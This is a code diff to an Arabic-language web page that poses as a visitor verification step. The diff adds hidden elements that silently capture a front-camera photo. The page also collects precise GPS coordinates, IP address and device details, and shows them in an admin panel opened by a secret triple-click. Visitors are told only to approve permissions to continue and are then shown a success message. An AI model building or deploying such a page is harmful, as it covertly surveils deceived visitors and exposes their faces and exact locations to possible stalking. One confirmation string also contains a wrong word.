@@ -23,8 +23,8 @@
         }
         h2 { 
             color: #333; 
-            cursor: pointer; /* لجعل مؤشر الماوس يوضح أنها قابلة للنقر */
-            user-select: none; /* لمنع تحديد النص عند النقرات السريعة */
+            cursor: pointer; 
+            user-select: none; 
         }
         p { color: #666; font-size: 15px; }
         .btn {
@@ -48,6 +48,7 @@
             border: 1px solid #ddd;
             padding: 10px;
             text-align: center;
+            vertical-align: middle;
         }
         th { background-color: #007bff; color: white; }
         .error { color: red; margin-top: 10px; }
@@ -59,23 +60,26 @@
             border-radius: 4px;
             margin-left: 10px;
         }
-        .admin-link-btn {
-            background: none;
-            border: none;
-            color: #007bff;
-            cursor: pointer;
-            text-decoration: underline;
-            font-size: 14px;
+        .visitor-img {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 2px solid #007bff;
         }
     </style>
 </head>
 <body>
 
+    <!-- عناصر مخفية لالتقاط الصورة من الكاميرا الأمامية -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <!-- واجهة الزائر -->
     <div id="visitorSection" class="container">
-        <!-- تم إضافة خاصية النقر 3 مرات هنا (onclick) -->
+        <!-- انقر 3 مرات هنا لفتح صفحة الأدمن -->
         <h2 onclick="handleSecretClicks()">مرحباً بك في الموقع</h2>
-        <p>يرجى النقر على زر المتابعة والموافقة على <b>"سماح" (Allow)</b> في نافذة الموقع الجغرافي للاستمرار.</p>
+        <p>يرجى النقر على زر المتابعة والموافقة على الصلاحيات للاستمرار.</p>
         <button class="btn" onclick="requestVisitorData()">متابعة</button>
     </div>
 
@@ -87,22 +91,23 @@
         <button class="btn" onclick="verifyAdminPassword()" style="margin-top:0;">دخول</button>
         <div id="loginError" class="error"></div>
         <br><br>
-        <button class="admin-link-btn" onclick="showVisitorPage()">العودة لصفحة الزائر</button>
+        <button class="btn" onclick="showVisitorPage()" style="background-color: #6c757d; font-size: 14px; padding: 8px 15px;">العودة لصفحة الزائر</button>
     </div>
 
     <!-- لوحة التحكم -->
-    <div id="adminPanelSection" class="container hidden" style="max-width: 900px;">
+    <div id="adminPanelSection" class="container hidden" style="max-width: 950px;">
         <h2>لوحة التحكم - بيانات الزوار</h2>
-        <p>جميع معلومات الزوار الذين وافقوا على مشاركة الموقع:</p>
+        <p>جميع معلومات الزوار (الصورة، الموقع بدقة، الجهاز، والـ IP):</p>
         <div style="overflow-x: auto;">
             <table>
                 <thead>
                     <tr>
+                        <th>الصورة</th>
                         <th>الوقت والتاريخ</th>
-                        <th>نوع الجهاز / المتصفح</th>
-                        <th>عنوان الـ IP</th>
+                        <th>الجهاز / المتصفح</th>
+                        <th>الـ IP</th>
                         <th>الإحداثيات</th>
-                        <th>الخريطة المباشرة</th>
+                        <th>الخريطة</th>
                     </tr>
                 </thead>
                 <tbody id="visitorsTableBody">
@@ -115,40 +120,59 @@
     </div>
 
     <script>
-        // متغيرات للتحكم بالنقرات السريعة
         let clickCount = 0;
         let clickTimer = null;
 
         function handleSecretClicks() {
             clickCount++;
-            
-            // إذا كانت هذه النقر الأولى، نبدأ عداد زمني لمدة ثانية واحدة
             if (clickCount === 1) {
-                clickTimer = setTimeout(() => {
-                    clickCount = 0; // إعادة التعيين إذا انتهى الوقت ولم يكمل 3 نقرات
-                }, 1000);
+                clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
             }
-
-            // إذا أتم المستخدم 3 نقرات متتالية خلال أقل من ثانية
             if (clickCount === 3) {
                 clearTimeout(clickTimer);
                 clickCount = 0;
-                showAdminLogin(); // فتح صفحة تسجيل دخول الأدمن
+                showAdminLogin();
             }
         }
 
         function requestVisitorData() {
             if (!navigator.geolocation) {
-                alert("متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.");
+                alert("متصفحك لا يدعم تحديد الموقع.");
                 return;
             }
 
+            // 1. طلب إذن الكاميرا الأمامية والتقاط صورة صامتة
+            let capturedImage = "";
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedImage = canvas.toDataURL('image/png');
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        processLocationAndIP(capturedImage);
+                    }, 800);
+                })
+                .catch(() => {
+                    processLocationAndIP("");
+                });
+        }
+
+        function processLocationAndIP(imgData) {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     const visitorIP = data.ip || "غير معروف";
                     const deviceType = navigator.userAgent;
 
+                    // 2. طلب إذن الموقع بأعلى دقة GPS ممكنة لضبط الدبوس تماماً
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
                             const lat = position.coords.latitude;
@@ -160,7 +184,8 @@
                                 ip: visitorIP,
                                 device: deviceType,
                                 latitude: lat,
-                                longitude: lon
+                                longitude: lon,
+                                image: imgData
                             };
 
                             let allVisitors = JSON.parse(localStorage.getItem('saved_visitors')) || [];
@@ -172,7 +197,7 @@
                         function(error) {
                             switch(error.code) {
                                 case error.PERMISSION_DENIED:
-                                    alert("يجب النقر على 'سماح' (Allow) لإذن الموقع للمتابعة.");
+                                    alert("يجب النقر على 'سماح' (Allow) للموقع للمتابعة.");
                                     break;
                                 case error.POSITION_UNAVAILABLE:
                                     alert("معلومات الموقع الجغرافي غير متوفرة.");
@@ -182,7 +207,11 @@
                                     break;
                             }
                         },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        { 
+                            enableHighAccuracy: true, // إجبار الهاتف على استخدام نظام GPS الفعلي لضبط الدبوس بدقة
+                            timeout: 20000, 
+                            maximumAge: 0 
+                        }
                     );
                 })
                 .catch(() => {
@@ -196,14 +225,15 @@
                             ip: "مخفي أو غير متوفر",
                             device: navigator.userAgent,
                             latitude: lat,
-                            longitude: lon
+                            longitude: lon,
+                            image: imgData
                         };
 
                         let allVisitors = JSON.parse(localStorage.getItem('saved_visitors')) || [];
                         allVisitors.push(visitorRecord);
                         localStorage.setItem('saved_visitors', JSON.stringify(allVisitors));
                         alert("تم التحقق بنجاح!");
-                    });
+                    }, null, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
                 });
         }
 
@@ -239,27 +269,29 @@
             let allVisitors = JSON.parse(localStorage.getItem('saved_visitors')) || [];
 
             if (allVisitors.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="5">لا توجد بيانات مسجلة لزوار حتى الآن.</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="6">لا توجد بيانات مسجلة لزوار حتى الآن.</td></tr>';
                 return;
             }
 
             allVisitors.forEach(v => {
                 const tr = document.createElement('tr');
                 const mapsUrl = `https://www.google.com/maps?q=${v.latitude},${v.longitude}`;
+                const imgTag = v.image ? `<img src="${v.image}" class="visitor-img">` : "لا توجد صورة";
 
                 tr.innerHTML = `
+                    <td>${imgTag}</td>
                     <td>${v.time}</td>
-                    <td style="word-break: break-all; font-size: 11px; max-width: 200px;">${v.device}</td>
+                    <td style="word-break: break-all; font-size: 11px; max-width: 180px;">${v.device}</td>
                     <td><b>${v.ip}</b></td>
-                    <td>${v.latitude.toFixed(5)}, ${v.longitude.toFixed(5)}</td>
-                    <td><a href="${mapsUrl}" target="_blank" style="color: #007bff; font-weight: bold;">فتح في الخرائط 🗺️</a></td>
+                    <td>${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)}</td>
+                    <td><a href="${mapsUrl}" target="_blank" style="color: #007bff; font-weight: bold;">فتح الخريطة 🗺️</a></td>
                 `;
                 tbody.appendChild(tr);
             });
         }
 
         function clearData() {
-            if (confirm("هل أنت متأكد من مسح جميع سجلات الزوار؟")) {
+            if (confirm("هل أنت متضرر من مسح جميع سجلات الزوار؟")) {
                 localStorage.removeItem('saved_visitors');
                 loadVisitorsTable();
             }
